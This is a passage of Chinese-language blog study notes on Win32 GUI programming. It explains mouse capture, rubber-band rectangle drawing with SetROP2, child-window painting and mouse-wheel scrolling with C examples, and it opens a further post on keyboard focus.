created the window. Its value is initially zero.</td>
</tr>
<tr>
<td style="text-align: left;"><strong>GWL_WNDPROC</strong>-4</td>
<td style="text-align: left;">Retrieves the address of the window
procedure, or a handle representing the address of the window procedure.
You must use the <a
target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows/desktop/api/winuser/nf-winuser-callwindowproca">CallWindowProc</a>
function to call the window procedure.</td>
</tr>
</tbody>
</table>
<p>The following values are also available when the <em>hWnd</em>
parameter identifies a dialog box.</p>
<table>
<colgroup>
<col style="width: 43%" />
<col style="width: 56%" />
</colgroup>
<thead>
<tr>
<th style="text-align: left;">Value</th>
<th style="text-align: left;">Meaning</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align: left;"><strong>DWL_DLGPROC</strong>DWLP_MSGRESULT
+ sizeof(LRESULT)</td>
<td style="text-align: left;">Retrieves the address of the dialog box
procedure, or a handle representing the address of the dialog box
procedure. You must use the <a
target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows/desktop/api/winuser/nf-winuser-callwindowproca">CallWindowProc</a>
function to call the dialog box procedure.</td>
</tr>
<tr>
<td style="text-align: left;"><strong>DWL_MSGRESULT</strong>0</td>
<td style="text-align: left;">Retrieves the return value of a message
processed in the dialog box procedure.</td>
</tr>
<tr>
<td style="text-align: left;"><strong>DWL_USER</strong>DWLP_DLGPROC +
sizeof(DLGPROC)</td>
<td style="text-align: left;">Retrieves extra information private to the
application, such as handles or pointers.</td>
</tr>
</tbody>
</table>
</blockquote>
<p>例子中获取的是子窗口的HMENU索引值</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">idFocus = GetWindowLong(hwnd, GWL_ID);</span><br></pre></td></tr></table></figure>
<p>这句的意思就是子窗口将idFocus当前焦点窗口寄存器设置为子窗口自己</p>
<p>当子窗口失去焦点的时候需要通知失效重绘,其原因是WM_PAINT中获得焦点的子窗口会多绘制一些提示信息,那么当它失去焦点的时候就得擦除提示信息了</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220814172257251.png"
alt="image-20220814172257251" />
<figcaption aria-hidden="true">image-20220814172257251</figcaption>
</figure>
<h4 id="子窗口绘图消息">子窗口绘图消息</h4>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> WM_PAINT:</span><br><span class="line">	hdc = BeginPaint(hwnd, &amp;ps);</span><br><span class="line"></span><br><span class="line">	GetClientRect(hwnd, &amp;rect);</span><br><span class="line">	Rectangle(hdc, <span class="number">0</span>, <span class="number">0</span>, rect.right, rect.bottom);<span class="comment">//绘制边框</span></span><br><span class="line">	<span class="comment">// Draw the &quot;x&quot; mark</span></span><br><span class="line">	<span class="keyword">if</span> (GetWindowLong(hwnd, <span class="number">0</span>))<span class="comment">//通过0号属性观察本窗口应该是按下还是起来的状态,</span></span><br><span class="line">	&#123;<span class="comment">//如果应该按下则本子窗口画出对角线</span></span><br><span class="line">		MoveToEx(hdc, <span class="number">0</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">		LineTo(hdc, rect.right, rect.bottom);</span><br><span class="line">		MoveToEx(hdc, <span class="number">0</span>, rect.bottom, <span class="literal">NULL</span>);</span><br><span class="line">		LineTo(hdc, rect.right, <span class="number">0</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">// Draw the &quot;focus&quot; rectangle </span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (hwnd == GetFocus())<span class="comment">//如果当前子窗口正在获得焦点,那么额外画出提示信息</span></span><br><span class="line">	&#123;</span><br><span class="line">		rect.left += rect.right / <span class="number">10</span>;<span class="comment">//设置内方框信息</span></span><br><span class="line">		rect.right -= rect.left;</span><br><span class="line">		rect.top += rect.bottom / <span class="number">10</span>;</span><br><span class="line">		rect.bottom -= rect.top;</span><br><span class="line">		SelectObject(hdc, GetStockObject(NULL_BRUSH));<span class="comment">//不使用画刷</span></span><br><span class="line">		SelectObject(hdc, CreatePen(PS_DASH, <span class="number">0</span>, <span class="number">0</span>));<span class="comment">//画笔改成虚线模式</span></span><br><span class="line">		Rectangle(hdc, rect.left, rect.top, rect.right,rect.bottom);</span><br><span class="line">		DeleteObject(SelectObject(hdc, GetStockObject(BLACK_PEN)));<span class="comment">//删除刚才创建的逻辑画笔实例</span></span><br><span class="line">	&#125;</span><br><span class="line">	EndPaint(hwnd, &amp;ps);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br></pre></td></tr></table></figure>
<h2 id="捕获鼠标">捕获鼠标</h2>
<p>书上举了一个例子,一个绘图程序,假如要绘制一个矩形,鼠标左键按下之后确定矩形一个点,不松开拖着鼠标移动则实时绘制矩形边框,(好像这个边框叫做橡皮线)</p>
<p>当鼠标左键松开时确定整个矩形,此时填充矩形表明完成绘制</p>
<h3 id="例程">例程</h3>
<h4 id="绘制边框橡皮线函数">绘制边框橡皮线函数</h4>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">DrawBoxOutline</span><span class="params">(HWND hwnd, POINT ptBeg, POINT ptEnd)</span><span class="comment">//正常情况下客户区内松开左键时调用,填充矩形</span></span><br><span class="line">&#123;</span><br><span class="line">	HDC hdc;</span><br><span class="line">	hdc = GetDC(hwnd);</span><br><span class="line">	SetROP2(hdc, R2_NOT);<span class="comment">//该函数的作用是,只要是绘图,当前背景色取反,原来是白板,取反得黑,交替使用绘图函数会呈现一白一黑</span></span><br><span class="line">	SelectObject(hdc, GetStockObject(NULL_BRUSH));<span class="comment">//设置画笔无色,用ROP2反色下一次画出黑色</span></span><br><span class="line">	Rectangle(hdc, ptBeg.x, ptBeg.y, ptEnd.x, ptEnd.y);</span><br><span class="line">	ReleaseDC(hwnd, hdc);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>ptBeg和ptEnd都是相对于hwnd的客户区而言的,意思是在hwnd中绘制一个左上角ptBeg到右下角的ptEnd矩形边框</p>
<h4 id="setrop2">SetROP2</h4>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">SetROP2</span><span class="params">(</span></span><br><span class="line"><span class="params">  [in] HDC hdc,</span></span><br><span class="line"><span class="params">  [in] <span class="type">int</span> rop2<span class="comment">//样式</span></span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>The <strong>SetROP2</strong> function sets the current foreground mix
mode. GDI uses the foreground mix mode to combine pens and interiors of
filled objects with the colors already on the screen. The foreground mix
mode defines how colors from the brush or pen and the colors in the
existing image are to be combined.</p>
</blockquote>
<p>SetROP2函数设置当前前景的混合模式.</p>
<p>GDI使用前景混合模式,作用是将画笔画刷的行为和先前已有的颜色结合起来.也就是说本次绘画会影响之前的绘画,rop2参数指定怎么个影响方法,是将像素点的颜色异或还是按位与还是直接擦除先前颜色等等</p>
<blockquote>
<p>前景和背景是相反的,背景在正文图层的下面,前景在正文图层的上面</p>
</blockquote>
<p>rop2的可选值:</p>
<table>
<colgroup>
<col style="width: 23%" />
<col style="width: 76%" />
</colgroup>
<thead>
<tr>
<th style="text-align: left;">Mix mode</th>
<th style="text-align: left;">Meaning</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align: left;"><strong>R2_BLACK</strong></td>
<td
style="text-align: left;">直接画黑,不考虑很多,不使用画笔颜色,相当于设置了一个寂寞</td>
</tr>
<tr>
<td style="text-align: left;"><strong>R2_COPYPEN</strong></td>
<td style="text-align: left;">继续使用画笔颜色,相当于设置了一个寂寞</td>
</tr>
<tr>
<td style="text-align: left;"><strong>R2_MASKNOTPEN</strong></td>
<td style="text-align: left;">原屏幕颜色和画笔反色的结合</td>
</tr>
<tr>
<td style="text-align: left;"><strong>R2_MASKPEN</strong></td>
<td style="text-align: left;">Pixel is a combination of the colors
common to both the pen and the screen.</td>
</tr>
<tr>
<td style="text-align: left;"><strong>R2_MASKPENNOT</strong></td>
<td style="text-align: left;">Pixel is a combination of the colors
common to both the pen and the inverse of the screen.</td>
</tr>
<tr>
<td style="text-align: left;"><strong>R2_MERGENOTPEN</strong></td>
<td style="text-align: left;">Pixel is a combination of the screen color
and the inverse of the pen color.</td>
</tr>
<tr>
<td style="text-align: left;"><strong>R2_MERGEPEN</strong></td>
<td style="text-align: left;">Pixel is a combination of the pen color
and the screen color.</td>
</tr>
<tr>
<td style="text-align: left;"><strong>R2_MERGEPENNOT</strong></td>
<td style="text-align: left;">Pixel is a combination of the pen color
and the inverse of the screen color.</td>
</tr>
<tr>
<td style="text-align: left;"><strong>R2_NOP</strong></td>
<td style="text-align: left;">啥也不改变,更是个寂寞</td>
</tr>
<tr>
<td style="text-align: left;"><strong>R2_NOT</strong></td>
<td style="text-align: left;">和原屏幕颜色相反</td>
</tr>
<tr>
<td style="text-align: left;"><strong>R2_NOTCOPYPEN</strong></td>
<td style="text-align: left;">笔的反色</td>
</tr>
<tr>
<td style="text-align: left;"><strong>R2_NOTMASKPEN</strong></td>
<td style="text-align: left;">Pixel is the inverse of the R2_MASKPEN
color.</td>
</tr>
<tr>
<td style="text-align: left;"><strong>R2_NOTMERGEPEN</strong></td>
<td style="text-align: left;">Pixel is the inverse of the R2_MERGEPEN
color.</td>
</tr>
<tr>
<td style="text-align: left;"><strong>R2_NOTXORPEN</strong></td>
<td style="text-align: left;">Pixel is the inverse of the R2_XORPEN
color.</td>
</tr>
<tr>
<td style="text-align: left;"><strong>R2_WHITE</strong></td>
<td style="text-align: left;">Pixel is always 1.</td>
</tr>
<tr>
<td style="text-align: left;"><strong>R2_XORPEN</strong></td>
<td style="text-align: left;">Pixel is a combination of the colors in
the pen and in the screen, but not in both.</td>
</tr>
</tbody>
</table>
<h4 id="左键按下消息-1">左键按下消息</h4>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> WM_LBUTTONDOWN:</span><br><span class="line">	ptBeg.x = ptEnd.x = LOWORD(lParam);<span class="comment">//ptBeg获取当前鼠标位置</span></span><br><span class="line">	ptBeg.y = ptEnd.y = HIWORD(lParam);</span><br><span class="line"></span><br><span class="line">	DrawBoxOutline(hwnd, ptBeg, ptEnd);<span class="comment">//描矩形边.使用ptBeg,ptEnd指定主对角线的矩形</span></span><br><span class="line"></span><br><span class="line">	SetCursor(LoadCursor(<span class="literal">NULL</span>, IDC_CROSS));<span class="comment">//左键按下后进入绘制状态,鼠标变成十字提示绘图</span></span><br><span class="line"></span><br><span class="line">	fBlocking = TRUE;<span class="comment">//一个flag,表征鼠标是否一直按下,这个状态会被Esc键修改,表示终止绘图</span></span><br><span class="line">	SetCapture(hwnd);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br></pre></td></tr></table></figure>
<p>左键按下时就已经开始绘图了,首先绘制一个点,即左键按下时的鼠标位置,</p>
<p>fBlocking变量用来记录绘图过程中有没有被Esc打断过.</p>
<p>SetCapture(hwnd)意思是从调用该函数开始,所有鼠标动作,包括不在本客户区的鼠标动作,全都被本程序捕获.这种状态需要到ReleaseCapture解出</p>
<h5 id="setreleasecapture">Set/ReleaseCapture</h5>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SetCapture(hwnd);//此函数执行之后所有的鼠标动作将被hwnd指向的窗口捕获</span><br><span class="line">ReleaseCapture();//直到本函数执行之后鼠标动作才会恢复正常</span><br></pre></td></tr></table></figure>
<h4 id="鼠标移动消息">鼠标移动消息</h4>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> WM_MOUSEMOVE:</span><br><span class="line">	<span class="keyword">if</span> (fBlocking)</span><br><span class="line">	&#123;</span><br><span class="line">		SetCursor(LoadCursor(<span class="literal">NULL</span>, IDC_CROSS));</span><br><span class="line"></span><br><span class="line">		DrawBoxOutline(hwnd, ptBeg, ptEnd);</span><br><span class="line"></span><br><span class="line">		ptEnd.x = LOWORD(lParam);</span><br><span class="line">		ptEnd.y = HIWORD(lParam);</span><br><span class="line"></span><br><span class="line">		DrawBoxOutline(hwnd, ptBeg, ptEnd);<span class="comment">//这里矩形边框画了两次,是因为后来这一次会更新前面那一次,由于SetROP2已经设置了黑白交替绘画,</span></span><br><span class="line">		<span class="comment">//当前一次是黑笔是,后一次是白笔就擦除了前面的绘制</span></span><br><span class="line">		<span class="comment">//如此做到只能看到一个实时边框,否则只绘制一次会导致很多重影</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br></pre></td></tr></table></figure>
<p>由于左键起来之后会进行结算,因此绘图时的鼠标移动是压着左键移动的</p>
<p>首先判断了fBlocking的状态,如果被Esc打断则直接退出,不做处理</p>
<p>这里调用了两次<code>DrawBoxOutline</code>,其作用是:</p>
<p>由于<code>SetROP2(hdc, R2_NOT)</code>这个设置,会导致相邻两次绘图使用的颜色相反</p>
<p>如果本次使用黑色,那么下一次就使用白色</p>
<p>这样交替绘制的意义是:刚用黑色绘制出边框,接着逻辑上擦除它,但是在屏幕上不显示擦除,这就是压着黑笔停下时仍然能看到过期的客户区上有边框线.当画笔再次移动时,先前的边框已经被逻辑擦除,此时再画新线保证只有新线,不会有重影.这就实现了橡皮线的效果</p>
<p>这里两次调用<code>DrawBoxOutline</code>,头一次的ptEnd没有被修改,也就是上一次绘图使用的ptEnd,那么重绘这个矩形,相当于擦除了上一次的绘制</p>
<h4 id="左键起来消息">左键起来消息</h4>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> WM_LBUTTONUP:</span><br><span class="line">	<span class="keyword">if</span> (fBlocking)<span class="comment">//如果fBlocking==1说明左键按下没有起来过并且没有被Esc中断过</span></span><br><span class="line">	&#123;</span><br><span class="line">		DrawBoxOutline(hwnd, ptBeg, ptEnd);<span class="comment">//这里只调用了一次,是因为这一次要固定边框位置了,直接描黑</span></span><br><span class="line"></span><br><span class="line">		ptBoxBeg = ptBeg;</span><br><span class="line">		ptBoxEnd.x = LOWORD(lParam);<span class="comment">//准备好需要填充的矩形范围</span></span><br><span class="line">		ptBoxEnd.y = HIWORD(lParam);</span><br><span class="line">		</span><br><span class="line">		ReleaseCapture();</span><br><span class="line">		SetCursor(LoadCursor(<span class="literal">NULL</span>, IDC_ARROW));<span class="comment">//放下屠刀之后,鼠标变成了斜向箭头样式</span></span><br><span class="line">		fBlocking = FALSE;<span class="comment">//关闭中断标志,为下一次绘图做准备</span></span><br><span class="line">		fValidBox = TRUE;<span class="comment">//设置填充区域有效,可以填充,为WM_PAINT做准备</span></span><br><span class="line"></span><br><span class="line">		InvalidateRect(hwnd, <span class="literal">NULL</span>, TRUE);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br></pre></td></tr></table></figure>
<p>首先判断fBlocking状态,如果中途被Esc打断过则不做处理</p>
<p>调用一次<code>DrawBoxOutline</code>擦除最后一次<code>WM_MOUSEMOVE</code>留下的边框.但是最后一次WM_MOUSEMOVE和WM_LBUTTONUP的到达时间非常接近,拉不开差距,因此这个函数调用与否意义不大,除非电脑很卡</p>
<p>释放对鼠标的捕获状态,程序对于客户区以外的鼠标动作不再处理</p>
<p>鼠标样式还原为斜向箭头</p>
<p>重置中断标志,设置绘图标志有效,提醒WM_PAINT应该绘制填充矩形了</p>
<h4 id="esc中断消息">Esc中断消息</h4>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> WM_CHAR:</span><br><span class="line">	<span class="keyword">if</span> (fBlocking &amp; wParam == <span class="string">&#x27;\x1B&#x27;</span>) <span class="comment">// i.e., Escape //按下Esc终止绘制矩形,即使左键正在按下</span></span><br><span class="line">	&#123;</span><br><span class="line">		DrawBoxOutline(hwnd, ptBeg, ptEnd);</span><br><span class="line"></span><br><span class="line">		SetCursor(LoadCursor(<span class="literal">NULL</span>, IDC_ARROW));</span><br><span class="line"></span><br><span class="line">		fBlocking = FALSE;<span class="comment">//Esc中止逻辑修改了一个fBlocking,就可以让程序知道左键按下起来之间有没有被中断过</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br></pre></td></tr></table></figure>
<p>对于该消息,例子采用的是处理字符消息,而不是处理虚拟键消息</p>
<p>如果出现Esc消息并且fBlocking表明正在绘图,那么设置fBlocking绘图无效</p>
<p>此后由于WM_MOUSEMOVE需要判断fBlocking正在绘图才继续绘制边框,因此Esc出现之后矩形边框橡皮线立刻消失</p>
<p>然而这种绘制失效的状态需要等到<strong>左键起来</strong>才能完全恢复</p>
<p>WM_LBUTTONUP也会先判断fBlocking是否还有效.无效则啥也不处理</p>
<p>此时所有标志都恢复原状(fValidBox压根没有被改变过,fBlocking被Esc重置为假)</p>
<h4 id="绘图消息-2">绘图消息</h4>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> WM_PAINT:</span><br><span class="line">	hdc = BeginPaint(hwnd, &amp;ps);</span><br><span class="line">	<span class="keyword">if</span> (fValidBox)<span class="comment">//这个值只能通过鼠标左键起来修改,表明确实有过画图</span></span><br><span class="line">	&#123;</span><br><span class="line">		SelectObject(hdc, GetStockObject(BLACK_BRUSH));</span><br><span class="line">		Rectangle(hdc, ptBoxBeg.x, ptBoxBeg.y,ptBoxEnd.x, ptBoxEnd.y);<span class="comment">//填充</span></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (fBlocking)<span class="comment">//fBlocking=1表明正在绘图,应当打印边框</span></span><br><span class="line">	&#123;</span><br><span class="line">		SetROP2(hdc, R2_NOT);</span><br><span class="line">		SelectObject(hdc, GetStockObject(NULL_BRUSH));</span><br><span class="line">		Rectangle(hdc, ptBeg.x, ptBeg.y, ptEnd.x,ptEnd.y);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	EndPaint(hwnd, &amp;ps);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br></pre></td></tr></table></figure>
<p>fValidBox是LBUTTONUP准备好的绘制标志,如果绘画中途没有Esc中断则LBUTTONUP消息处理中,会把fValidBox置有效,提醒WM_PAINT应该画图了</p>
<p>修改画刷为黑色画刷然后填充最后确定的矩形</p>
<p>如果fBlocking为有效说明仍然没有确定矩形的另一个点,此时WM_PAINT也打印矩形边框橡皮线,然而是多次一句,因为WM_MOUSEMOVE已经把这件事干了.</p>
<h4 id="窗口销毁消息-2">窗口销毁消息</h4>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> WM_DESTROY:</span><br><span class="line">	PostQuitMessage(<span class="number">0</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="鼠标滚动">鼠标滚动</h2>
<h3 id="鼠标滚动消息wm_mousewheel">鼠标滚动消息WM_MOUSEWHEEL</h3>
<p>当鼠标滚轮滚动时,该消息将被发往<strong>焦点窗口</strong>,</p>
<p>参数意义:</p>
<h4 id="wparam-3">wParam</h4>
<p>高字表明滚动增量</p>
<p>低字表明同时按下的虚拟键</p>
<table>
<thead>
<tr>
<th style="text-align: left;">Value</th>
<th style="text-align: left;">Meaning</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align: left;"><strong>MK_CONTROL</strong>0x0008</td>
<td style="text-align: left;">The CTRL key is down.</td>
</tr>
<tr>
<td style="text-align: left;"><strong>MK_LBUTTON</strong>0x0001</td>
<td style="text-align: left;">The left mouse button is down.</td>
</tr>
<tr>
<td style="text-align: left;"><strong>MK_MBUTTON</strong>0x0010</td>
<td style="text-align: left;">The middle mouse button is down.</td>
</tr>
<tr>
<td style="text-align: left;"><strong>MK_RBUTTON</strong>0x0002</td>
<td style="text-align: left;">The right mouse button is down.</td>
</tr>
<tr>
<td style="text-align: left;"><strong>MK_SHIFT</strong>0x0004</td>
<td style="text-align: left;">The SHIFT key is down.</td>
</tr>
<tr>
<td style="text-align: left;"><strong>MK_XBUTTON1</strong>0x0020</td>
<td style="text-align: left;">The first X button is down.</td>
</tr>
<tr>
<td style="text-align: left;"><strong>MK_XBUTTON2</strong>0x0040</td>
<td style="text-align: left;">The second X button is down.</td>
</tr>
</tbody>
</table>
<h4 id="lparam-3">lParam</h4>
<p>低字表明此时鼠标位置横坐标,屏幕坐标</p>
<p>高字表明纵坐标</p>
<h3 id="滚动增量">滚动增量</h3>
<p>衡量滚得狠不狠的参数,如果一下子转了好几圈显然增量很大,如果只发生了很少的转动,那么这点增量几乎不能导致程序卷动</p>
<p>在控制面板中我们可以设置滚动灵敏度,相同的滚动增量,假设都转一圈,可能灵敏度高的可以滚动一整页,灵敏度低的滚了三行,这是怎么实现的呢?</p>
<p>用滚动增量除以一个灵敏度系数,不妨给这个量起名<strong>灵敏后增量</strong>(我乱起的)</p>
<p>比如滚动增量为120,除以3得到40就是灵敏后增量.</p>
<p>在程序中我们可以设置一个<strong>单位行增量</strong>,意思是多少滚动增量可以导致程序卷动一个行,比如说设置为40</p>
<p>那么当灵敏度系数为3,那么初始时的120滚动增量就可以得到40
的灵敏后增量,刚好可以卷动一行</p>
<p>如果灵敏度系数为1,则灵敏后增量就是120.可以卷动三行</p>
<p>这就体现出不同灵敏度的区别了</p>
<h3 id="加装滚动动作的sysmets程序">加装滚动动作的Sysmets程序</h3>
<h4 id="滚动相关变量">滚动相关变量</h4>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> iDeltaPerLine, iAccumDelta;</span><br><span class="line">ULONG ulScrollLines;</span><br></pre></td></tr></table></figure>
<p>iDeltaPerLine即单位行增量</p>
<p>iAccumDelta表示先前的滚动效果的累加,可以理解为初始滚动量</p>
<p>ulScrollLines存放灵敏度系数</p>
<h4 id="滚动消息">滚动消息</h4>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> WM_MOUSEWHEEL:</span><br><span class="line">	<span class="keyword">if</span> (iDeltaPerLine == <span class="number">0</span>)<span class="keyword">break</span>;</span><br><span class="line">	iAccumDelta += (<span class="type">short</span>)HIWORD(wParam);<span class="comment">//累计滚动量</span></span><br><span class="line">	<span class="keyword">while</span> (iAccumDelta &gt;= iDeltaPerLine) &#123;<span class="comment">//能滚就滚</span></span><br><span class="line">		SendMessage(hwnd, WM_VSCROLL, SB_LINEUP, <span class="number">0</span>);<span class="comment">//滚一行</span></span><br><span class="line">		iAccumDelta -= iDeltaPerLine;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">while</span> (iAccumDelta &lt;= -iDeltaPerLine) &#123;<span class="comment">//倒着能滚就滚</span></span><br><span class="line">		SendMessage(hwnd, WM_VSCROLL, SB_LINEDOWN, <span class="number">0</span>);</span><br><span class="line">		iAccumDelta += iDeltaPerLine;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br></pre></td></tr></table></figure>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://deutschball.github.io/2022/08/12/windows%20SDK%20chapter%206%20keyboard/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="https://raw.githubusercontent.com/DeutschBall/picbed/main/dustball.png">
      <meta itemprop="name" content="dustball">
      <meta itemprop="description" content="dustland">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="dustland">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/08/12/windows%20SDK%20chapter%206%20keyboard/" class="post-title-link" itemprop="url">win32程序设计-chapter6 键盘</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2022-08-12 23:38:00 / Modified: 23:46:10" itemprop="dateCreated datePublished" datetime="2022-08-12T23:38:00+08:00">2022-08-12</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="windows-sdk-chapter-6-keyboard">windows SDK chapter 6
keyboard</h1>
<h2 id="键盘基础">键盘基础</h2>
<h3 id="who-is-using-the-keyboard">who is using the keyboard?</h3>
<p>正在使用键盘的窗口,称为有输入焦点的窗口</p>
<p>windows操作系统上处于最顶层的窗口往往是焦点窗口,然而存在两分屏看似并列的情况,实际上这时候可以从多方面判断哪个窗口是焦点窗口</p>
<p>比如从任务栏</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220812083837696.png"
alt="image-20220812083837696" />
<figcaption aria-hidden="true">image-20220812083837696</figcaption>
</figure>
<p>这里Typora上有高亮,就是焦点窗口,</p>
<p>windows终端,DEVC++,VisualStudio等等都是黑色的,不是焦点窗口</p>
<p>又如从标题栏</p>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220812083907654.png"
alt="image-20220812083907654" />
<figcaption aria-hidden="true">image-20220812083907654</figcaption>
</figure>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/DeutschBall/main/image-20220812083932266.png"
alt="左侧typora为焦点窗口,其标题栏为深色." />
<figcaption
aria-hidden="true">左侧typora为焦点窗口,其标题栏为深色.</figcaption>
</figure>
<p>在word,wps等等文字编辑器中,是否获得焦点更加明显,只要光标在闪烁就意味着持有焦点</p>
<p>实际上窗口过程通过处理<code>WM_SETFOCUS,WM_KILLFOCUS</code>两个消息来判断自己有没有焦点</p>
